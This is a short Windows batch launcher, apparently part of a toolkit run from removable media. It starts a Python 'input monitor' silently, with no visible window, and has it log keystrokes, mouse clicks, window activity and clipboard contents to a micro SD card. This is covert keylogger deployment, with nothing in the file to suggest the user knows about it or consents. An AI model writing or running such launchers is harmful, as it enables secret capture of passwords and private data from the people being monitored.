@echo off
REM ============================================================================
REM  FLLC - Silent Input Monitor Launcher
REM  Starts the input activity monitor with no visible window.
REM  Logs keystrokes, mouse clicks, window activity, clipboard to MICRO SD.
REM ============================================================================

REM Auto-detect drive
set "DRIVE=%~d0"
if "%DRIVE%"=="" set "DRIVE=I:"

REM Try pythonw (no window), then python minimized
where pythonw >nul 2>nul
if %errorlevel% equ 0 (
    start "" /b pythonw "%~dp0input_monitor.py" --output "%DRIVE%\" --silent --flush 10 --max-size 500
) else (
    start "" /min python "%~dp0input_monitor.py" --output "%DRIVE%\" --silent --flush 10 --max-size 500
)

exit
